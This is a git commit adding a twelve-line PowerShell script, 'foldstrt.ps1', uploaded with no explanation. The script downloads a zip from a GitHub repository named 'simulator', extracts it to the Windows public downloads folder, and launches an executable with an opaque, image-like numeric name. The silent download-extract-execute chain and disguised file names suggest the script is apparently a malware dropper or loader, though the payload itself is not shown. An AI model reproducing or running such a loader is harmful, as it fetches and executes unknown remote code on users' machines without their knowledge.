9757e4358323894cf17e641b689580bd5916a185
ededx <117166001+ededx@users.noreply.github.com>
2023-11-16 21:56:16 +0100

    Add files via upload

---
+++ foldstrt.ps1
@@ -0,0 +1,12 @@
+# Source URL
+$url = "https://github.com/ededx/simulator/raw/main/img1290017.zip"
+
+# Destation file
+$dest = "C:\Users\Public\Downloads\img1290017.zip"
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $dest
+
+Expand-Archive C:\Users\Public\Downloads\img1290017.zip -DestinationPath C:\Users\Public\Downloads\
+
+Start-Process -FilePath C:\Users\Public\Downloads\img1290017\img1291006\img0208832581.exe
